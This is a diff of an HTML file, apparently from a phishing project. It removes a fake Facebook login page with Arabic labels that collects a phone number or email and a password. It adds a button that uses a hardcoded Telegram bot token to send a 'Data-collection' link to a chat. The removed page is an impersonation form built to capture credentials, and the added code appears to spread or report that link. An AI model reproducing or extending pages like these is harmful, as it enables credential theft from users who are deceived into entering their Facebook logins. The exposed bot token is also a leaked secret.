@@ -3,73 +3,36 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Login</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #f0f2f5;
-            margin: 0;
-            padding: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-        }
-        .login-container {
-            background-color: #fff;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            width: 100%;
-            max-width: 360px;
-            text-align: center;
-        }
-        .login-container h1 {
-            color: #1877f2;
-            font-size: 32px;
-            margin-bottom: 20px;
-        }
-        .login-container input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            font-size: 16px;
-        }
-        .login-container button {
-            width: 100%;
-            padding: 10px;
-            background-color: #1877f2;
-            color: #fff;
-            border: none;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        .login-container button:hover {
-            background-color: #145dbf;
-        }
-        .login-container p {
-            margin-top: 10px;
-            color: #666;
-            cursor: pointer;
-        }
-        .login-container p:hover {
-            text-decoration: underline;
-        }
-    </style>
+    <title>Send Telegram Message</title>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Facebook</h1>
-        <form id="loginForm">
-            <input type="text" id="username" name="username" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
-            <input type="password" id="password" name="password" placeholder="كلمة المرور" required>
-            <button type="submit">تسجيل الدخول</button>
-        </form>
-        <p id="forgotPassword">هل نسيت كلمة المرور؟</p>
-    </div>
-    <script src="script.js"></script>
+    <button id="startButton">اضغط هنا لبدء البوت</button>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = "7913260818:AAGT5rKbYr6RdKrO5O3OKmBKbSpsdSZ_Z5Y";
+        const CHAT_ID = "6514749116";
+        const link = "https://hanoybot.github.io/Data-collection/";
+
+        document.getElementById("startButton").addEventListener("click", () => {
+            const message = `مرحبا! هذا هو الرابط الخاص بك:\n${link}`;
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message,
+                }),
+            })
+                .then((response) => {
+                    if (response.ok) {
+                        alert("تم إرسال الرابط إلى تليجرام بنجاح!");
+                    } else {
+                        alert("حدث خطأ أثناء الإرسال.");
+                    }
+                })
+                .catch((error) => console.error("Error:", error));
+        });
+    </script>
 </body>
 </html>
